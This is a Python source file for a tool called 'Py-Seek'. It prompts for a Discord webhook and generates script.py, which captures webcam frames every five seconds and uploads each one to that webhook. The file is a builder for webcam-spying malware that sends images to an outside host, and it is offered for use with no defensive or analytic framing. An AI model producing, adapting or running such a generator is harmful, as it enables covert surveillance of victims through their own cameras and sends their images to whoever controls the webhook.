from colorama import Fore
import os
import subprocess
import fade

def cls():
    if os.name =="nt":
        os.system("title:  Py-Seek | By: trape_cipher ")
        os.system("cls")
    else:
        os.system("clear")
cls()

green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

design = """\n
 
\t\t        ░░▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒░░░░                        
\t\t    ░░▒▒▒▒▒▒░░░░▓▓▓▓▓▓██████▒▒░░░░                    
\t\t  ░░▒▒▒▒▒▒░░▒▒▓▓██████▓▓▓▓████▓▓▒▒                    
\t\t░░▒▒▒▒░░▒▒▓▓██▓▓▒▒░░      ▒▒▓▓██▓▓▒▒░░                
\t\t░░░░░░▒▒▓▓▓▓▓▓▒▒░░▒▒████▒▒    ▓▓▓▓██▒▒░░              
\t\t░░░░▒▒▓▓▒▒▒▒▓▓▒▒▒▒████████▒▒  ▒▒▓▓▓▓██▒▒              
\t\t░░▒▒██▒▒░░▒▒▒▒░░▓▓██    ████░░░░▒▒░░▓▓██▒▒░░          
\t\t░░▒▒░░░░  ▒▒▒▒░░▓▓████▒▒████░░▒▒▒▒  ▒▒████▒▒░░        
\t\t░░▒▒▓▓▒▒░░▒▒▓▓▒▒▒▒████████▒▒░░▓▓░░  ▒▒▓▓▒▒░░          
\t\t  ░░▒▒▓▓▒▒▒▒▓▓▒▒░░▒▒▓▓▓▓▒▒░░▒▒▒▒░░▒▒▒▒░░              
\t\t    ░░▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▓▓░░                
\t\t      ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                  
\t\t        ░░░░░░▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒░░░░                    
\t\t              ░░░░░░░░░░░░░░░░  

\t\t               P Y - S E E K         """

print(fade.purpleblue(design))
webhook = input(f"{blue}Input Discord Webhook >>> {reset}")

def create_new_script(webhook_url):
    script_content = """
import cv2 as cv
import time
import requests
import os
import tempfile

cap = cv.VideoCapture(0)
screenshot_interval = 5
start_time = time.time()
filename = None

while True:
    ret, frame = cap.read()

    if time.time() - start_time >= screenshot_interval:
        temp_dir = tempfile.gettempdir()
        filename = os.path.join(temp_dir, 'screenshot.png')
        cv.imwrite(filename, frame)
        start_time = time.time()

    if filename:
        webhook_url = '%s'
        with open(filename, 'rb') as f:
            response = requests.post(webhook_url, files={'file': f})
        if response.status_code == 200:
            print('Image sent successfully!')
            os.remove(filename)
        else:
            print(f'Error sending image: {response.status_code} - {response.text}')
        filename = None

    cv.imshow('Webcam', frame)

    if cv.waitKey(1) == ord('q'):
        break

cap.release()
cv.destroyAllWindows()
""" % webhook_url

    with open('script.py', 'w') as new_script:
        new_script.write(script_content)

create_new_script(webhook)

print(f"{green}Code Generated Successfully{reset}\n")

